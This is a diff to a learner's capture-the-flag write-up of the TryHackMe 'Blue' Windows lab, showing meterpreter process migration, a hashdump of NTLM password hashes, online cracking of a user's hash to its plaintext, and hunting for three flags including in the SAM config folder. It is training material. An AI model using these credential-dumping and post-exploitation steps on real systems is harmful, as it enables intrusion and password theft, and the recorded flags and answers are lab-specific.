@@ -1,6 +1,6 @@
 https://tryhackme.com/r/room/blue
-
-Date Completed: 5/10/2024
+Date Started: 5/10/2024
+Date Completed: 5/12/2024 (got pulled away from it took me roughly 2 hours because of unstable shells and note taking).
 
 TASK1_RECON:
 1. Scan the machine.
@@ -201,3 +201,136 @@ Process List
 
  PID   PPID  Name            Arch  Session  User                      Path
  ---   ----  ----            ----  -------  ----                      ----
+2940  712   spoolsv.exe     x64   0        NT AUTHORITY\SYSTEM       C:\Windows\System32\spoo
+                                                                      lsv.exe
+
+It took me a while to find a service to migrate to, but this one seems pretty reliable. I had to watch the guide to figure out which one to migrate to. 
+
+8. Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 
+meterpreter > migrate 2940
+[*] Migrating from 3048 to 2940...
+[*] Migration completed successfully.
+
+TASK4_CRACKING: 
+
+1. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
+2. Copy this password hash to a file and research how to crack it. What is the cracked password?
+
+Copied hash: ffb43f0de35be4d9917ac0cc8ad57f8d
+Cracked hash: alqfna22
+I used this website to crack it: https://crackstation.net/
+
+TASK5_FIND_FLAGS!
+
+1.Flag1? This flag can be found at the system root.
+Hint: Can you C it?
+Alright let's look in the C drive...
+C:\Windows\system32>cd ..
+cd ..
+
+C:\Windows>cd ..
+cd ..
+
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\
+
+03/17/2019  02:27 PM                24 flag1.txt
+07/13/2009  10:20 PM    <DIR>          PerfLogs
+04/12/2011  03:28 AM    <DIR>          Program Files
+03/17/2019  05:28 PM    <DIR>          Program Files (x86)
+12/12/2018  10:13 PM    <DIR>          Users
+03/17/2019  05:36 PM    <DIR>          Windows
+               1 File(s)             24 bytes
+               5 Dir(s)  20,504,199,168 bytes free
+
+C:\>type flag1.txt
+type flag1.txt
+flag{access_the_machine}
+
+2. Flag2? This flag can be found at the location where passwords are stored within Windows.
+My first thought is etc/passwd but was wrong, I asked chatgpt where windows passwords are stored and they are in config 
+C:\Windows\System32\config>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\Windows\System32\config
+
+05/12/2024  07:14 PM    <DIR>          .
+05/12/2024  07:14 PM    <DIR>          ..
+12/12/2018  06:00 PM            28,672 BCD-Template
+05/12/2024  07:24 PM        18,087,936 COMPONENTS
+05/12/2024  07:44 PM           262,144 DEFAULT
+03/17/2019  02:32 PM                34 flag2.txt
+07/13/2009  09:34 PM    <DIR>          Journal
+05/12/2024  07:44 PM    <DIR>          RegBack
+03/17/2019  03:05 PM           262,144 SAM
+05/12/2024  07:24 PM           262,144 SECURITY
+05/12/2024  07:46 PM        40,632,320 SOFTWARE
+05/12/2024  07:49 PM        12,582,912 SYSTEM
+11/20/2010  09:41 PM    <DIR>          systemprofile
+12/12/2018  06:03 PM    <DIR>          TxR
+               8 File(s)     72,118,306 bytes
+               6 Dir(s)  20,512,980,992 bytes free
+C:\Windows\System32\config>type flag2.txt
+type flag2.txt
+flag{sam_database_elevated_access}
+
+3. flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
+My first thought is to go into /users.
+C:\Users>cd Jon
+cd Jon
+
+C:\Users\Jon>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\Users\Jon
+
+12/12/2018  10:13 PM    <DIR>          .
+12/12/2018  10:13 PM    <DIR>          ..
+12/12/2018  10:13 PM    <DIR>          Contacts
+12/12/2018  10:49 PM    <DIR>          Desktop
+12/12/2018  10:49 PM    <DIR>          Documents
+12/12/2018  10:13 PM    <DIR>          Downloads
+12/12/2018  10:13 PM    <DIR>          Favorites
+12/12/2018  10:13 PM    <DIR>          Links
+12/12/2018  10:13 PM    <DIR>          Music
+12/12/2018  10:13 PM    <DIR>          Pictures
+12/12/2018  10:13 PM    <DIR>          Saved Games
+12/12/2018  10:13 PM    <DIR>          Searches
+12/12/2018  10:13 PM    <DIR>          Videos
+               0 File(s)              0 bytes
+              13 Dir(s)  20,448,727,040 bytes free
+
+C:\Users\Jon>cd Documents
+cd Documents
+
+C:\Users\Jon\Documents>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\Users\Jon\Documents
+
+12/12/2018  10:49 PM    <DIR>          .
+12/12/2018  10:49 PM    <DIR>          ..
+03/17/2019  02:26 PM                37 flag3.txt
+               1 File(s)             37 bytes
+               2 Dir(s)  20,448,727,040 bytes free
+
+C:\Users\Jon\Documents>type flag3.txt
+type flag3.txt
+flag{admin_documents_can_be_valuable}
+
+And I was right! It was a fun room and learned some more and got to practice more with metasploit. 
